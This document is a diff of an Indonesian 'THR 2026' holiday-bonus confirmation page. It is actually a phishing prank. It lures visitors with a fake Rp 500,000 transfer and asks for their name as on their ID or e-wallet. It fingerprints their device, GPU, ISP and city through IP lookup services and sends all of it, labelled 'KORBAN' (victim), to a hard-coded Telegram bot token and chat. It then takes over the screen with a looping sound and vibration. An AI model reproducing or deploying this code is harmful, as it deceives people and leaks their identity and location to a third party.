@@ -5,15 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Konfirmasi Penerimaan THR 2026 🌙</title>
     <style>
-        body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
+        body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
         #intro { margin-top: -50px; padding: 0 20px; z-index: 5; }
-        h1 { color: #15803d; margin-bottom: 5px; font-size: 1.8rem; }
+        h1 { color: #15803d; margin-bottom: 5px; font-size: 1.8rem; text-shadow: 1px 1px 2px rgba(0,0,0,0.05); }
         p { color: #166534; margin-top: 0; font-weight: bold; }
-        #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 20px; width: 280px; z-index: 6; }
-        input { width: 90%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 10px; outline: none; text-align: center; font-size: 1rem; }
-        #envelope { width: 280px; cursor: pointer; transition: 0.2s; z-index: 10; margin-top: 10px; }
-        #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; justify-content: center; align-items: center; }
+        
+        #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); margin-bottom: 25px; width: 280px; z-index: 6; border: 1px solid #dcfce7; }
+        input { width: 90%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 10px; outline: none; text-align: center; font-size: 1rem; transition: 0.3s; }
+        input:focus { border-color: #15803d; box-shadow: 0 0 8px rgba(21, 128, 61, 0.2); }
+        
+        #envelope { width: 280px; cursor: pointer; transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 10; margin-top: 10px; }
+        #envelope:hover { transform: scale(1.05); }
+        #envelope:active { transform: scale(0.9); }
+        
+        #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; justify-content: center; align-items: center; cursor: pointer; }
         #prank-screen img { width: 100%; height: 100%; object-fit: contain; }
+        
         #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 50; flex-direction: column; align-items: center; justify-content: center; }
         .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #15803d; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -27,14 +34,14 @@
     </div>
 
     <div id="verify-box">
-        <input type="text" id="victim-name" placeholder="Nama Sesuai KTP" autocomplete="off">
+        <input type="text" id="victim-name" placeholder="Nama Sesuai KTP/E-Wallet" autocomplete="off">
     </div>
 
-    <img id="envelope" src="amplop.png" alt="Amplop THR">
+    <img id="envelope" src="amplop.png" alt="Klik untuk Ambil THR">
 
     <div id="loading-overlay">
         <div class="spinner"></div>
-        <p id="status-text" style="margin-top: 20px; font-weight: bold; color: #15803d;">Menghubungkan ke server bank...</p>
+        <p id="status-text" style="margin-top: 20px; font-weight: bold; color: #15803d;">Menghubungkan ke API Bank...</p>
     </div>
 
     <div id="prank-screen" onclick="location.reload()">
@@ -48,66 +55,89 @@
         const statusText = document.getElementById('status-text');
         const prank = document.getElementById('prank-screen');
         
-        // PRE-LOAD SUARA
+        // 1. PRE-LOAD SUARA
         const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
         prankSound.load();
 
+        // DATA BOT TELEGRAM
         const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
         const TELE_ID = '7267912519'; 
 
         async function kirimLog(nama) {
             const ua = navigator.userAgent;
-            let device = /android/i.test(ua) ? "Android" : (/iPhone|iPad|iPod/i.test(ua) ? "iPhone/iOS" : "PC");
-            
-            // Deteksi GPU (buat nebak chipset HP)
+            let os = /android/i.test(ua) ? "Android" : (/iPhone|iPad|iPod/i.test(ua) ? "iOS" : "PC");
+            let seri = ua.split(') ')[0].split('(')[1] || "Unknown";
+
+            // Deteksi GPU (Hardware)
             const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const GPU = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Unknown GPU";
-            
-            let isp = "Unknown";
-            let kota = "Unknown";
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            let gpu = "Blocked/Null";
+            if (gl) {
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Generic GPU";
+            }
 
+            let isp = "Blocked/AdBlock";
+            let city = "Unknown";
+
+            // Deteksi Provider & Lokasi (Paket API Bandel)
             try {
-                const res = await fetch('https://ipwho.is/');
+                const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                isp = d.connection.isp || "Unknown";
-                kota = d.city || "Unknown";
-            } catch (e) { isp = "AdBlock/Error"; }
+                isp = d.org || "Unknown ISP";
+                city = d.city || "Unknown City";
+            } catch (e) {
+                // Fallback jika API pertama diblokir
+                try {
+                    const res2 = await fetch('https://api.ipify.org?format=json');
+                    const d2 = await res2.json();
+                    isp = "IP: " + d2.ip;
+                } catch (e2) {}
+            }
 
-            const teks = `🎯 KORBAN: ${nama}\n📱 OS: ${device}\n🔍 Seri: ${ua.split(') ')[0].split('(')[1]}\n🎮 GPU: ${GPU}\n🌐 Provider: ${isp}\n📍 Lokasi: ${kota}\n⏰ Jam: ${new Date().toLocaleTimeString()}`;
+            // Susun Laporan
+            const teks = `🎯 KORBAN: ${nama}\n📱 OS: ${os}\n🔍 Seri: ${seri}\n🎮 GPU: ${gpu}\n🌐 Provider: ${isp}\n📍 Lokasi: ${city}\n⏰ Jam: ${new Date().toLocaleTimeString()}`;
             
+            // Kirim ke Telegram (Mode No-Cors agar tidak terhambat)
             fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(teks)}`, { mode: 'no-cors' });
         }
 
         env.addEventListener('click', () => {
             const nama = nameInput.value.trim();
             if (nama === "") {
-                alert("Masukkan nama dulu bos!");
+                alert("Woi, isi nama dulu biar saldo bisa dikirim!");
                 return;
             }
 
-            // --- TRICK: AKTIFKAN FULLSCREEN & SUARA SECEPATNYA ---
+            // --- TRICK: PAKSA FULLSCREEN & BUKA AKSES SUARA ---
             const elem = document.documentElement;
             if (elem.requestFullscreen) elem.requestFullscreen();
             else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
             
-            // Pancing suara biar browser ijinin main nanti
-            prankSound.play().then(() => { prankSound.pause(); prankSound.currentTime = 0; }).catch(() => {});
-            // ----------------------------------------------------
+            prankSound.play().then(() => { 
+                prankSound.pause(); 
+                prankSound.currentTime = 0; 
+            }).catch(() => {});
+            // -------------------------------------------------
 
             kirimLog(nama);
+
             loading.style.display = 'flex';
-            setTimeout(() => { statusText.innerText = "Memverifikasi data " + nama + "..."; }, 1000);
-            setTimeout(() => { statusText.innerText = "Proses transfer saldo Rp 500.000..."; }, 2500);
+            setTimeout(() => { statusText.innerText = "Memverifikasi data " + nama + "..."; }, 1200);
+            setTimeout(() => { statusText.innerText = "Mengalokasikan saldo THR Rp 500.000..."; }, 2800);
+            setTimeout(() => { statusText.innerText = "Menunggu persetujuan Bank..."; }, 4200);
 
             setTimeout(() => {
                 loading.style.display = 'none';
                 prank.style.display = 'flex';
+                
+                // MAININ SUARA KETAWA MONYET (LOOP)
                 prankSound.loop = true;
                 prankSound.play();
-                if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500]);
-            }, 5500);
+                
+                // Getar HP Korban (Android)
+                if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500, 100, 500]);
+            }, 6000);
         });
     </script>
 </body>
